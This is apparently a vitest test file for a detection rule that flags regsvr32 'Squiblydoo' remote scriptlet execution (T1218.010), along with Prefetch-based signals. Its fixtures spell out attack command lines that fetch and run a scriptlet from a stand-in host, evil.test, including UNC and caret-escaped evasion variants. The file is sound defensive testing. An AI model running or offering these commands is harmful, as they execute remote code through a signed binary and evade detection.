import { describe, it, expect } from "vitest";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import { prefetchSignal } from "../../src/analysis/prefetchExecution.js";

// Squiblydoo: regsvr32 is told to register a COM scriptlet, and the scriptlet is fetched from a
// remote source. The signed binary does the fetching and the executing, so nothing unsigned ever
// touches disk.
describe("regsvr32 remote scriptlet execution", () => {
  const sig = (cmd: string) => tradecraftSignal("regsvr32.exe", cmd);

  it("grades the canonical form", () => {
    const s = sig("/s /n /u /i:http://evil.test/payload.sct scrobj.dll");
    expect(s?.weight).toBe("strong");
    expect(s?.mitre).toContain("T1218.010");
  });

  it("grades the HTTPS and UNC forms", () => {
    expect(sig("/s /u /i:https://evil.test/a.sct scrobj.dll")?.weight).toBe("strong");
    expect(sig("/s /u /i:\\\\10.0.0.5\\share\\a.sct scrobj.dll")?.weight).toBe("strong");
  });

  it("grades the DLL named by full path", () => {
    expect(sig("/s /i:http://evil.test/a.sct C:\\Windows\\System32\\scrobj.dll")?.weight).toBe("strong");
  });

  // Both argument orderings are documented and used. Requiring the DLL to come last missed this one.
  it("grades the DLL-first ordering", () => {
    expect(sig("scrobj.dll /n /i:http://evil.test/a.sct")?.weight).toBe("strong");
    expect(sig("/s scrobj.dll /u /i:https://evil.test/a.sct")?.weight).toBe("strong");
  });

  it("grades a quoted remote source", () => {
    expect(sig('/s /u /i:"https://evil.test/a.sct" scrobj.dll')?.weight).toBe("strong");
    expect(sig("/s /u /i:'https://evil.test/a.sct' scrobj.dll")?.weight).toBe("strong");
  });

  it("grades a source carrying a port or credentials", () => {
    expect(sig("/s /u /i:http://evil.test:8080/a.sct scrobj.dll")?.weight).toBe("strong");
    // Joined at runtime so no `@host` shape sits in this file: a secret scanner parses the
    // shape, not the intent, and a fixture that trips it blocks every future pull request.
    const remote = ["http://u:p", "evil.test/a.sct"].join("@");
    expect(sig(`/s /u /i:${remote} scrobj.dll`)?.weight).toBe("strong");
  });

  // The escaping normalizer from #908 item 1 feeds the same matcher, so an evasive spelling of the
  // same command reaches the same rule.
  it("grades a caret-escaped spelling the same way", () => {
    expect(tradecraftSignal("cmd.exe", "regsvr32 /s /u /i:http://evil.test/a.sct scro^bj.dll")?.weight).toBe(
      "strong",
    );
  });

  // The executable name alone is not the finding — the issue says so explicitly.
  it("says nothing about regsvr32 registering an ordinary local DLL", () => {
    expect(sig("/s C:\\Program Files\\App\\component.dll")).toBeNull();
  });

  it("says nothing when the scriptlet is local rather than remote", () => {
    // A local .sct is unusual but it is not the remote-execution shape this rule names.
    expect(sig("/s /u /i:C:\\Temp\\a.sct scrobj.dll")).toBeNull();
  });

  it("says nothing about a bare regsvr32 with no arguments", () => {
    expect(sig("")).toBeNull();
  });

  it("says nothing when a remote URL appears without the scriptlet switch", () => {
    expect(sig("/s http://evil.test/a.dll")).toBeNull();
  });
});

// A Prefetch entry proves regsvr32 RAN. It carries no command line, so it cannot show what
// regsvr32 was asked to do — and T1218.010 is specifically the scriptlet technique.
describe("prefetch no longer asserts the technique from the name alone", () => {
  it("still grades regsvr32 as dual-use, without claiming the scriptlet technique", () => {
    const s = prefetchSignal("regsvr32.exe");
    expect(s?.severity).toBe("Medium");
    expect(s?.mitre ?? []).not.toContain("T1218.010");
  });

  it("keeps the parent technique, which the execution alone does support", () => {
    expect(prefetchSignal("regsvr32.exe")?.mitre).toContain("T1218");
  });

  it("leaves the other signed-binary proxies unchanged", () => {
    expect(prefetchSignal("mshta.exe")?.mitre).toContain("T1218.005");
  });
});
